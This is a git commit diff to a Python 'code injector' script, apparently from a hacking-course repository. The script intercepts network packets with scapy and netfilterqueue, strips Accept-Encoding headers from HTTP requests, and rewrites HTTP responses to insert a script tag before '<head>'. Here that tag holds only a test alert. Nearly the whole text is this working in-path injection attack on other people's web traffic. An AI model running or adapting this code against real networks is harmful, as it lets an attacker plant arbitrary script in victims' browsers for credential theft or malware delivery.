ebc4cad0bf3d08fef2ad13d06b3d800bf3c50a36
jonalOW <jonalgaming@gmail.com>
2021-03-06 07:21:27 -0500

    Injects an simple alert

--- Code_Injector/code_injector.py
+++ Code_Injector/code_injector.py
@@ -11,7 +11,6 @@ import re
 
 def set_load(packet,load):
     packet[scapy.Raw].load = load
-    print("[+] Modified package")
     del packet[scapy.IP].len
     del packet[scapy.IP].chksum
     del packet[scapy.TCP].chksum
@@ -25,11 +24,11 @@ def process_packet(packet):
             modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
             new_packet = set_load(scapy_packet, modified_load)
             packet.set_payload(str(new_packet))
-
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] HTTP Respond")
-            print(scapy_packet.show())
-
+            modified_load = scapy_packet[scapy.Raw].load.replace("<head>", "<script>alert('test');</script><head>")
+            new_packet = set_load(scapy_packet, modified_load)
+            packet.set_payload(str(new_packet))
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
